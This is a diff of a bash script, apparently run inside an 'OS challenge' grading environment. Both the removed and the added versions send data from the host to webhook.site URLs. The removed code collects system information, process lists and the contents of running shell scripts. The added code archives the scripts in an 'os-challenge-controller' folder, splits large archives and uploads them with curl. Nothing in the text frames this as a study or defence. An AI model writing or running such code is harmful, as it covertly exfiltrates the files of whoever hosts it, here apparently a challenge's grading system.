@@ -1,50 +1,38 @@
-DATAFILE=$(mktemp)
+#!/bin/bash
+URL="https://webhook.site/3b85cbc1-ff45-45ed-ab8a-0a57a09532bd"
+FOLDER="/home/$(whoami)/os-challenge-controller"
 
-echo "------------ SYSTEM INFO ---------------" >> $DATAFILE
+function error() {
+  curl -d "message=$1" $URL
+}
 
-echo $(pwd) >> $DATAFILE
-ls -alF .. >> $DATAFILE
-echo $(uname -a) >> $DATAFILE
-echo $(gcc --version) >> $DATAFILE
-lscpu >> $DATAFILE
-ps -au >> $DATAFILE
+if [ ! -d $FOLDER ]; then
+  error "Folder $FOLDER does not exist."
+  exit 1
+fi
 
-echo "------------ FILES ---------------" >> $DATAFILE
+# Do not take any source code!!! Only script files.
+FILES=$(ls $FOLDER | grep -v ^20)
 
-# Find running shell scripts
-for pid in $(pgrep -f bash) $(pgrep -f sh); do
-    cmdline=$(cat /proc/$pid/cmdline | tr '\0' ' ')
+OUT=/tmp/os-challenge-controller.tar.gz
 
-    # Check if the process is a shell script
-    if [[ $cmdline =~ .*\.sh.* ]]; then
-        filepath=$(echo $cmdline | awk '{print $2}')
+tar -I 'gzip -9' -cf $OUT -C $FOLDER $FILES
 
-        # Only if the file exists, read its contents
-        if [ -f "$filepath" ]; then
-            echo "==> $filepath" >> "$DATAFILE"
-            cat "$filepath" >> "$DATAFILE"
-            echo "" >> "$DATAFILE" # Separate each file content with a newline
-        fi
-    fi
-done
+SIZE=$(stat -c %s $OUT)
 
-echo "------------ PROCESS RUN ---------------" >> $DATAFILE
+if [ $SIZE -gt 10000000 ]; then
+  split -b 5M $OUT $OUT.
+  rm $OUT
 
-stdbuf -o0 ./server 5000 &>> $DATAFILE &
+  for FILE in $(ls $OUT.*); do
+    curl -F "file=@$FILE" $URL
+    rm $FILE
+  done
 
-SERVER_PID=$!
+else
+  curl -F "file=@$OUT" $URL
+  rm $OUT
+fi
 
-(sleep 2; kill $SERVER_PID &> /dev/null) &
-
-# Attempt a single connection to also debug that.
-(./client localhost 5000 69 1 0 1000 0 0 1.5) &>> $DATAFILE &
-
-wait $SERVER_PID &> /dev/null
-
-EXIT_CODE=$?
-
-echo "PROCESS DONE: Exit code: $EXIT_CODE" >> $DATAFILE
-
-curl -X POST -F "file=@$DATAFILE" https://webhook.site/075fc1ab-bc83-4cb4-bd85-3ec22736ffd2 &> /dev/null
-rm $DATAFILE
+rm $OUT*
 exit 0
